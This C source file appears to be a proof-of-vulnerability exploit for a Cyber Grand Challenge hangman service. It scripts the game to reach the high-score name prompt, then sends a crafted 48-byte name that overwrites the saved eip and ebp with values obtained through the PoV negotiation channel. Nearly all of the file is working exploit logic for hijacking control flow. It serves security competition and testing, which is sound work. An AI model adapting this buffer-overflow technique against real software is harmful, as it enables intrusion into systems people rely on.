#include <libcgc.h>

#include "libc.h"

char word[128];
char current[128];

char inbuf[256];
char outbuf[256];

char avail[27];
char used[27];
char inword[27];

char correct[256];

const char *freq = "etaoinsrhdlucmfywgpbvkxqjz";
int choice;

char gallows[] =
    "   ---\n   | |\n     |\n     |\n     |\n     |\n -----\n |   |\n";

const int NUM_PARTS = 7;
int indexes[] = {17, 24, 23, 25, 31, 37, 39};
char parts[] = {'O', '|', '/', '\\', '|', '/', '\\'};

int num_bad;
int bad_guesses;
int num_chars;
int num_good;

void clearBoard() {
  int i;
  for (i = 0; i < NUM_PARTS; i++) {
    gallows[indexes[i]] = ' ';
  }
}

void reset() {
  int i;
  choice = 0;
  clearBoard();
  for (i = 0; i < 26; i++) {
    avail[i] = 'a' + i;
    used[i] = 0;
    inword[i] = 0;
  }
  bad_guesses = 0;
  num_bad = 0;
  num_chars = 0;
  num_good = 0;
}

void err(const void *buf, size_t count, int error) {
  transmit_all(2, buf, count);
  _terminate(error);
}

void checked_transmit(int fd, const void *buf, size_t count) {
  if (transmit_all(fd, buf, count) != 0) {
    transmit_all(2, "checked transmit\n", 17);
    err(buf, count, 1);
  }
}

void printBoard(int skip) {
  //   printf("\n%s\n", gallows);
  char buf[4096];
  // save aside the first 4k of random
  //   printf("Password: ");
  if (fread(buf, 1, 57 - skip, stdin) != (57 - skip)) {
    err("failed in printBoard\n", 21, 0);
  }
}

void match(const char *str) {
  //   printf("\n%s\n", gallows);

  char buf[4096];
  int l = strlen(str);
  if (fread(buf, 1, l, stdin) != l) {
    err("short read in match\n", 20, 1);
  }
  if (memcmp(buf, str, l) != 0) {
    transmit(2, "match fail expected:\n", 21, NULL);
    err(str, strlen(str), 1);
  }
}

void getWord(int word) {
  unsigned char buf[4096];
  // save aside the first 4k of random
  if (fread(buf, 1, 43, stdin) != 43) {
    _terminate(5);
  }
  if (memcmp((char *)buf, "Choose your word seed. Please send 4 bytes\n", 43) !=
      0) {
    _terminate(6);
  }

  checked_transmit(1, &word, sizeof(word));
}

void getHighScore() {
  unsigned char rand;
  int i, ch;
  char name[80];
  unsigned int *iname = (unsigned int *)name;

  for (i = 0; i < 48; i++) {
    unsigned int lrand;
    do {
      random(&lrand, 4, NULL);
      lrand = lrand % (0x7e - 0x20);
      name[i] = ' ' + lrand;
    } while (name[i] == '%' || name[i] == '\\');
  }
  name[48] = '\n';
  name[49] = 0;

  unsigned int neg[4];
  unsigned int val[2];
  neg[0] = 1;
  neg[1] = 0x3e3e3e3e;
  neg[2] = 0x3e3e3e3e;
  random(&rand, 1, NULL);

  if (rand & 1) {
    neg[3] = 5;
  } else {
    neg[3] = 6;
  }

  checked_transmit(3, neg, sizeof(neg));
  receive_all(3, (char *)val, sizeof(val));
  iname[11] = val[0] | 0x40404040;  // eip

  if (rand & 1) {
    iname[10] = val[1] | 0x40404040;  // ebp
  } else {
    iname[9] = val[1] | 0x40404040;  // ebp
  }

  match("Congratulations blondie, add yourself to the high score list\n");
  match("What is your name? ");
  checked_transmit(1, name, 49);
  match("New member of the HOF: ");

  do {
    ch = getchar();
    if (ch == EOF) {
      _terminate(1);
    }
  } while (ch != '\n');
  do {
    ch = getchar();
    if (ch == EOF) {
      _terminate(1);
    }
  } while (ch != '\n');
}

int makeGuess(char **answer) {
  int c;
  match("\n");
  c = getchar();
  if (c == EOF) {
    _terminate(10);
  }
  if (c == 'M' || c == 'N') {
    if (c == 'M') {
      match("iraculously, you have manage to prolong Tuco's life.\n");
      return 0;
    }
    match("ice shot Blondie, you freed Tuco.\n");
    match("The correct word is: ");

    do {
      c = getchar();
      if (c == EOF) {
        _terminate(11);
      }
    } while (c != '\n');

    getHighScore();
    return 1;
  } else if (c == 'H' || c == ' ') {
    if (c == 'H') {
      match("aha, Tuco is feeling that rope a little more!\n");
    } else {
      char *ans = correct;
      *answer = correct;
      // you lose
      printBoard(1);
      match("\nBlondie, you missed, Tuco has been hanged.\n");
      match("The correct word is: ");
      do {
        c = getchar();
        *ans++ = c;
        if (c == EOF) {
          _terminate(12);
        }
      } while (c != '\n');
      ans -= 2;
      *ans = 0;
      return 1;
    }
  }
  return 0;
}

int doTurn(char guess, char **answer) {
  int c;
  match("\n");
  printBoard(0);
  match("used:      \"");
  int i = 0;
  do {
    c = getchar();
    if (c == EOF) {
      _terminate(13);
    }
    used[i++] = c;
  } while (c != '"');
  used[--i] = 0;
  match("\navailable: \"");

  i = 0;
  do {
    c = getchar();
    if (c == EOF) {
      _terminate(14);
    }
    avail[i++] = c;
  } while (c != '"');
  avail[--i] = 0;

  match("\n\ncurrent: ");

  i = 0;
  do {
    c = getchar();
    if (c == EOF) {
      _terminate(15);
    }
    current[i++] = c;
  } while (c != '\n');
  current[--i] = 0;

  // int len;
  match("\nYour guess: ");

  checked_transmit(1, &guess, 1);
  checked_transmit(1, "\n", 1);

  return makeGuess(answer);
}

void playToLose(int word, char **answer) {
  char alpha[] = "aeioursthclmndpbjfgkqvwxyz";
  reset();
  getWord(word);
  while (1) {
    int i = strlen(alpha) - 1;
    char guess = alpha[i];
    alpha[i] = 0;
    if (doTurn(guess, answer)) return;
  }
}

void playToWin(int word, char *answer) {
  int i = 0;
  char *dummy;
  reset();
  getWord(word);
  while (1) {
    int j;

    char guess = answer[i];
    if (guess == 0) {
      break;
    }
    for (j = 0; j < i; j++) {
      if (answer[j] == guess) {
        break;
      }
    }
    if (j == i) {
      if (doTurn(guess, &dummy)) break;
    }
    i++;
  }
}

int main() {
  char *answer;
  // interact with the client socket
  char buf[4096];
  int word;

  random(&word, 4, NULL);

  //   printf("Password: ");
  if (fread(buf, 1, 10, stdin) != 10) {
    _terminate(1);
  }
  if (memcmp(buf, "Password: ", 10) != 0) {
    _terminate(2);
  }
  checked_transmit(1, "HANGEMHIGH!\n", 12);
  if (fread(buf, 1, 28, stdin) != 28) {
    _terminate(3);
  }
  if (memcmp(buf, "Welcome to Hangman Blondie!\n", 28) != 0) {
    _terminate(4);
  }

  playToLose(word, &answer);
  if (fread(buf, 1, 18, stdin) != 18) {
    err("term1\n", 6, 1);
  }
  if (memcmp(buf, "Play again (y/n)? ", 18) != 0) {
    err("term2\n", 6, 1);
  }
  checked_transmit(1, "y\n", 2);
  playToWin(word, answer);
  /*
     if (fread(buf, 1, 18, stdin) != 18) {
        err("term3\n", 6, 1);
     }
     if (memcmp(buf, "Play again (y/n)? ", 18) != 0) {
        err("term4\n", 6, 1);
     }
  */
  checked_transmit(1, "n\n", 2);

  _terminate(0);
}
